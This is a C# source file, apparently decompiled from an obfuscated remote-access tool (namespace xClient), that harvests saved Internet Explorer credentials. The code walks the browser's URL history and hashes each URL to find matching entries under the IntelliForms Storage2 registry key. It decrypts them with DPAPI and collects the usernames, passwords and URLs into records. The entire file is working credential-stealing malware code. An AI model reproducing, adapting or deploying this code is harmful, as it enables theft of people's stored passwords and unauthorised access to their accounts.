using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Recovery.Browsers;

public static class GClass19
{
	private struct Struct9
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;
	}

	private struct Struct10
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public Struct9 struct9_0;
	}

	[StructLayout(LayoutKind.Explicit)]
	private struct Struct11
	{
		[FieldOffset(0)]
		public uint uint_0;

		[FieldOffset(4)]
		public byte byte_0;

		[FieldOffset(5)]
		public byte byte_1;

		[FieldOffset(6)]
		public byte byte_2;

		[FieldOffset(7)]
		public byte byte_3;

		[FieldOffset(8)]
		public byte byte_4;

		[FieldOffset(9)]
		public byte byte_5;

		[FieldOffset(10)]
		public byte byte_6;

		[FieldOffset(11)]
		public byte byte_7;

		[FieldOffset(12)]
		public uint uint_1;
	}

	private enum Enum1
	{
		const_0 = 32771,
		const_1
	}

	private enum Enum2
	{
		const_0 = 1,
		const_1 = 2,
		const_2 = 4
	}

	[CompilerGenerated]
	private sealed class Class23
	{
		public string string_0;

		internal bool method_0(string value)
		{
			return value == string_0;
		}
	}

	private const string string_0 = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

	private const uint uint_0 = 1u;

	private const uint uint_1 = 4026531840u;

	private const int int_0 = 32768;

	private const int int_1 = 4;

	public static List<GClass56> smethod_0()
	{
		List<GClass56> list = new List<GClass56>();
		try
		{
			using ExplorerUrlHistory explorerUrlHistory = new ExplorerUrlHistory();
			List<string[]> list2 = new List<string[]>();
			ExplorerUrlHistory.STATURLEnumerator enumerator = explorerUrlHistory.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					GStruct3 current = enumerator.Current;
					try
					{
						if (!smethod_3(current.UrlString, list2))
						{
							continue;
						}
						foreach (string[] item in list2)
						{
							list.Add(new GClass56
							{
								Username = item[0],
								Password = item[1],
								URL = current.UrlString,
								Application = "InternetExplorer"
							});
						}
					}
					catch (Exception)
					{
					}
				}
				return list;
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<GClass56> smethod_1()
	{
		return new List<GClass56>();
	}

	private static T smethod_2<T>(byte[] bytes) where T : struct
	{
		GCHandle gCHandle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
		T result = (T)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(T));
		gCHandle.Free();
		return result;
	}

	private static bool smethod_3(string url, List<string[]> dataList)
	{
		string text = smethod_5(url);
		if (!smethod_4(text))
		{
			return false;
		}
		byte[] array;
		using (RegistryKey registryKey = GClass47.smethod_1(RegistryHive.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"))
		{
			if (registryKey == null)
			{
				return false;
			}
			array = (byte[])registryKey.GetValue(text);
		}
		byte[] array2 = new byte[2 * (url.Length + 1)];
		Buffer.BlockCopy(url.ToCharArray(), 0, array2, 0, url.Length * 2);
		byte[] array3 = ProtectedData.Unprotect(array, array2, (DataProtectionScope)0);
		Struct10 @struct = smethod_2<Struct10>(array3);
		if (array3.Length >= @struct.uint_0 + @struct.uint_1 + @struct.uint_2)
		{
			uint num = @struct.struct9_0.uint_2 / 2u;
			int num2 = Marshal.SizeOf(typeof(Struct11));
			byte[] array4 = new byte[@struct.uint_2];
			int srcOffset = (int)(@struct.uint_0 + @struct.uint_1);
			Buffer.BlockCopy(array3, srcOffset, array4, 0, array4.Length);
			if (dataList == null)
			{
				dataList = new List<string[]>();
			}
			else
			{
				dataList.Clear();
			}
			srcOffset = Marshal.SizeOf((object)@struct);
			for (int i = 0; i < num; i++)
			{
				byte[] array5 = new byte[num2];
				Buffer.BlockCopy(array3, srcOffset, array5, 0, array5.Length);
				Struct11 struct2 = smethod_2<Struct11>(array5);
				string[] array6 = new string[3];
				byte[] array7 = new byte[struct2.uint_1 * 2];
				Buffer.BlockCopy(array4, (int)struct2.uint_0, array7, 0, array7.Length);
				array6[0] = Encoding.Unicode.GetString(array7);
				srcOffset += num2;
				Buffer.BlockCopy(array3, srcOffset, array5, 0, array5.Length);
				struct2 = smethod_2<Struct11>(array5);
				byte[] array8 = new byte[struct2.uint_1 * 2];
				Buffer.BlockCopy(array4, (int)struct2.uint_0, array8, 0, array8.Length);
				array6[1] = Encoding.Unicode.GetString(array8);
				array6[2] = text;
				dataList.Add(array6);
				srcOffset += num2;
			}
		}
		return true;
	}

	private static bool smethod_4(string urlHash)
	{
		bool result = false;
		using RegistryKey registryKey = GClass47.smethod_1(RegistryHive.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
		if (registryKey == null)
		{
			return false;
		}
		if (registryKey.GetValueNames().Any((string value) => value == urlHash))
		{
			return true;
		}
		return result;
	}

	private static string smethod_5(string wstrURL)
	{
		IntPtr phProv = IntPtr.Zero;
		IntPtr phHash = IntPtr.Zero;
		CryptAcquireContext(out phProv, string.Empty, string.Empty, 1u, 4026531840u);
		if (!CryptCreateHash(phProv, Enum1.const_1, IntPtr.Zero, 0u, ref phHash))
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		byte[] bytes = Encoding.Unicode.GetBytes(wstrURL);
		StringBuilder stringBuilder = new StringBuilder(42);
		if (CryptHashData(phHash, bytes, (wstrURL.Length + 1) * 2, 0u))
		{
			uint pdwDataLen = 20u;
			byte[] array = new byte[20];
			if (!CryptGetHashParam(phHash, Enum2.const_1, array, ref pdwDataLen, 0u))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
			byte b = 0;
			stringBuilder.Length = 0;
			for (int i = 0; i < pdwDataLen; i++)
			{
				byte b2 = array[i];
				b = (byte)(b + b2);
				stringBuilder.AppendFormat("{0:X2}", b2);
			}
			stringBuilder.AppendFormat("{0:X2}", b);
			CryptDestroyHash(phHash);
		}
		CryptReleaseContext(phProv, 0u);
		return stringBuilder.ToString();
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptCreateHash(IntPtr hProv, Enum1 algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptDestroyHash(IntPtr hHash);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptGetHashParam(IntPtr hHash, Enum2 dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
}
